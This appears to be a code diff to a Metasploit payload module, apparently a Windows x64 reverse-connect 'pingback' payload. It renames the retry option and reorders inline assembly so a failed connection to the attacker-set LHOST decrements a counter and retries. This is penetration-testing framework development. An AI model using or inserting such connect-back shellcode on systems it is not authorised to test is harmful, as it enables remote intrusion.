@@ -37,7 +37,7 @@ module MetasploitModule
 
       encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
       retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
-      pingback_count = datastore['PingbackTries']
+      pingback_count = datastore['PingbackRetries']
       pingback_sleep = datastore['PingbackSleep']
 
       puts("Generating pingback single payload")
@@ -175,12 +175,12 @@ module MetasploitModule
           call rbp                ; WSAStartup( 0x0101, &WSAData );
 
         ; stick the retry count on the stack and store it
+          push #{retry_count}     ; retry counter
+          pop r14
           push #{(pingback_count)} 
           pop r15
 
         create_socket:
-          push #{retry_count}     ; retry counter
-          pop r14
         ; perform the call to WSASocketA...
           push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
           push rax                ; push null for reserved parameter
@@ -209,6 +209,8 @@ module MetasploitModule
         handle_connect_failure:
           dec r14                 ; decrement the retry count
           jnz try_connect
+          dec r15
+          jmp close_socket
 
         failure:
           call exitfunk
